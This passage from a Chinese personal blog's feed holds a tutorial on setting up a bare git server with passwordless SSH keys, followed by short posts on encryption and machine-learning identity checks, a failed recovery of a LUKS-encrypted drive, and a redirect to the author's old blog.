<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo adduser git</span><br></pre></td></tr></table></figure>
<p>然后就是创建版本库了，比如，我准备把仓库<code>test</code>放在<code>/home/wwwroot/</code>下，则<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot</span><br><span class="line">$ mkdir <span class="built_in">test</span></span><br><span class="line">$ sudo git init --bare <span class="built_in">test</span> </span><br><span class="line">$ sudo chown -R git:git <span class="built_in">test</span>    <span class="comment">#这句要在创建仓库后再使用</span></span><br></pre></td></tr></table></figure></p>
<p>这里有个要说明下，<code>--base</code> 参数是不把项目原文件放在仓库目录下，而是以另一种形式储存，也就是说，如果你把 <code>a.php</code> 文件上传到git仓库，则你在 <code>test</code> 文件夹中根本找不到 <code>a.php</code> 这个文件。</p>
<p>如果不加 <code>--bare</code> 参数，会出现一系列问题，现在我还没研究透，待我研究透侧了，再来补充。</p>
<p>这样服务端基本配置就好了，接下来就是客户端了。。</p>
<h1 id="附">附</h1><p>这里先假设一些东西，</p>
<blockquote>
<ol>
<li>服务器的ip是: 192.168.110.110</li>
<li>客户端1把项目储存在 ‘/home/wwwroot/default/test’ 目录下</li>
<li>把项目放在web服务器上 ‘/home/wwwroot/test.com’ 目录中，让外网访问<br>则</li>
</ol>
</blockquote>
<h1 id="客户端1">客户端1</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/default</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line">   <span class="comment"># 输入密码（免输入密码的方法我加在结尾的Other中）</span></span><br></pre></td></tr></table></figure>
<p>现在 <code>/home/wwwroot/default/test</code> 就是你的工作目录，或者可以把 <code>/test/.git</code>文件夹移到你的工作目录下。。</p>
<p>然后就是在有 <code>.git</code> 文件夹下，输入下面命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git add .                <span class="comment">#当前目录下的所以文件加入到版本库中，如果不像所有，可以 git add 具体文件</span></span><br><span class="line">$ git commit -m <span class="string">"这里你自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<p>上面这是在第一次提交文件，或者git仓库是空的情况下，假如是第二次提交，或者版本库中以有内容，则是。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -am <span class="string">"自己随便写"</span></span><br><span class="line">$ git push origin master</span><br></pre></td></tr></table></figure>
<h1 id="web服务器">web服务器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> /home/wwwroot/test.com</span><br><span class="line">$ git <span class="built_in">clone</span> git@<span class="number">192.168</span>.<span class="number">110.110</span>:/home/wwwroot/<span class="built_in">test</span></span><br><span class="line"> <span class="comment"># 输入密码</span></span><br></pre></td></tr></table></figure>
<p>当客户端1的项目更新提交了后，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git pull origin master</span><br></pre></td></tr></table></figure>
<hr>
<h1 id="Other">Other</h1><h2 id="免密码">免密码</h2><p>这里git文件传送使用的是ssh，所以其实也是ssh免输入密码的方式。<br>首先，编辑 <code>/etc/ssh/sshd_config</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ vim /etc/ssh/sshd_config</span><br><span class="line">AuthorizedKeysFile	.ssh/authorized_keys      <span class="comment">#这句前面的#号去了</span></span><br></pre></td></tr></table></figure>
<p>在客户端上使用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -P <span class="string">''</span></span><br><span class="line"> <span class="comment"># 则会在 ~/.ssh/ 目录下生产 id_rsa 和 id_rsa.pub..  这个就是传说中rsa加密的公钥和私钥</span></span><br></pre></td></tr></table></figure></p>
<p>把 <code>id_rsa.pub</code> 文件中的内容复制，粘贴到服务端 <code>~/.ssh/authorized_keys</code> 中</p>
<p><code>authorized_keys</code>文件的权限必须是644<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls -al</span><br><span class="line">-rw-r--r--. <span class="number">1</span> root root  authorized_keys</span><br></pre></td></tr></table></figure></p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>今天用git，把文件上传到服务器，然后下载下来，这些过了一遍。发现，在linux上git是最好用的。。。</p>
</blockquote>]]>
    
    </summary>
    
      <category term="GIT" scheme="http://0x48.pw/tags/GIT/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对于硬盘事件的随想]]></title>
    <link href="http://0x48.pw/2015/07/19/0x02/"/>
    <id>http://0x48.pw/2015/07/19/0x02/</id>
    <published>2015-07-19T14:38:44.000Z</published>
    <updated>2016-03-28T10:25:23.346Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>瞎J*乱想</p>
</blockquote>
<a id="more"></a>
<p>加密最初的目的就是让数据更安全，可是经过这次事件，我认为，加密本身就是一件不安全的事情</p>
<hr>
<p>加密的功能不是让别人无法读取我的信息，而是让不知道密码的人读取到信息，系统并不能检测你是否是本人，只能知道你输入的密码是否正确。</p>
<p>  这就会导致一系列问题，比如，我把密码忘了，再比如，非法分子得到了我的密码。</p>
<p>  还有就是会跟我这次一样，加大了我修复分区的难度，假如我的那个重要的分区没有使用LUKS加密，那么我的分区就能修复，我的数据就不会丢失了。</p>
<hr>
<p>所以，就出现了现在的机器学习，支付宝9.0也是这个理念，取消图案解锁，让支付宝app去学习用户的行为，去辨认用户。但是，现在网络上大部分都是在喷支付宝的这个理念，我觉得根本就是因为支付宝技术上还没达到，就把这个理念拿出来实施了。</p>
<p>我认为支付宝技术上还没达到的原因，一，就是网络上很多人对支付宝的测试，支付宝9.0没法通过用户的行为识别用户，二，就是我觉得，如果支付宝真的达到能让app自己去识别用户的水平，那么就会把所有密码取消掉了（至少留个登录密码，甚至连登录密码也不需要。），而不是现在只取消了图案解锁。</p>
<p>所以我认为，机器学习应该就是现在的主流。。</p>
<hr>
<p>但是我觉得机器学习还不够，我认为最好的方案就是人工智能，机器能像人一样思考，而不是分析海量的数据。</p>
<p>就比如，你去见你爸，一眼你就可以知道他是不是你爸爸，而不是需要他说一串密码，然后你进行确认，也不用去分析他的各种行为来进行确认。</p>
<p>而人工智能引发的什么人类危机就不属于我考虑的范围了，我估计人工智能要等到下一次革命，不知道我能不能看到。</p>
<hr>
<p>PS: 以上只是无聊时的突发奇想而已。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>瞎J*乱想</p>
</blockquote>]]>
    
    </summary>
    
      <category term="随笔" scheme="http://0x48.pw/tags/%E9%9A%8F%E7%AC%94/"/>
    
      <category term="S-essay" scheme="http://0x48.pw/categories/S-essay/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[对于这次硬盘坏掉事件小记]]></title>
    <link href="http://0x48.pw/2015/07/19/0x01/"/>
    <id>http://0x48.pw/2015/07/19/0x01/</id>
    <published>2015-07-18T17:17:46.000Z</published>
    <updated>2016-03-28T10:25:50.986Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>蛋疼</p>
</blockquote>
<a id="more"></a>
<h2 id="起因">起因</h2><p>  强行拔移动硬盘。导致分区损坏。无法挂载。</p>
<hr>
<h2 id="Then">Then</h2><p>  就花了几天时间研究怎么修复，因为我很多重要的东西都放在移动硬盘上，就比如这个博客，还有我写的py脚本。。还有很多视频，文档之类的。<br>期间研究了有win上的分区修复软件。也有linux上的。因为硬盘有1TB。比较大，一次扫描就花了我很长时间</p>
<hr>
<h2 id="Final">Final</h2><p>  我硬盘上分了两个NTFS分区，成功恢复，文件没丢失，在移动硬盘上装了一个kali，一个backbox，也成功恢复，没有丢失，。。。。<br>  可是，这些都没有特别重要的东西。。。最重要的是，我分了一个ext4 + LUKS 分区，重要的文件（代码，博客）,全存在这了。。。。恢复失败。。。</p>
<hr>
<h2 id="Now">Now</h2><p>  我现在还是太年轻了，无法修复，，所以，，备份完之后，，，把硬盘格了，，以前的博客没法更新了。。所以我花了一晚重新搭博客，，本来是准备把博文一篇一篇从html手工转为md的。。。。<br>  不过我突发奇想，在md中加入了js跳转，这样我在新建一个站点，以前的站点就不用了，挂到子域名下：<a href="http://old.lazysheep.cc" target="_blank" rel="external">http://old.lazysheep.cc</a></p>
<p>  下面一篇博文是传送门，点进去后会直接跳转到我前面的文章。。。。</p>
<h2 id="Review">Review</h2><p>  对于这次事件，做一个检讨。。。</p>
<blockquote>
<ul>
<li>没有做好备份工作。。。撸代码首先就是要学会备份，学会备份，学会备份。。。重要的事说三遍。。。。而我现在还是没养成备份的好习惯。。。。</li>
<li>我又不是什么重要的人，也没什么重要的东西。。。别作死的搞LUKS……NTFS的我恢复了。。ext4的我也恢复了。。。。可是LUKS + ext4的就恢复不了。。。。如果我不作死的给这个分区加密。。。。早就恢复好了。。。</li>
<li>事实证明。。没弹出USB设备进行强拔。。是会出问题的。会出问题的。出问题的。。。。。。。</li>
</ul>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>蛋疼</p>
</blockquote>]]>
    
    </summary>
    
      <category term="检讨" scheme="http://0x48.pw/tags/%E6%A3%80%E8%AE%A8/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[跳转到以前的博文]]></title>
    <link href="http://0x48.pw/2015/07/19/0x00/"/>
    <id>http://0x48.pw/2015/07/19/0x00/</id>
    <published>2015-07-18T17:17:45.000Z</published>
    <updated>2016-03-28T10:28:59.530Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>$\Uparrow$ 点击跳转<br><a id="more"></a></p>
<script>window.location.href="http://old.lazysheep.cc"</script>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>$\Uparrow$ 点击跳转<br>]]>
    
    </summary>
    
      <category term="Old博文" scheme="http://0x48.pw/tags/Old%E5%8D%9A%E6%96%87/"/>
    
      <category term="R-porter" scheme="http://0x48.pw/categories/R-porter/"/>
    
  </entry>
  
</feed>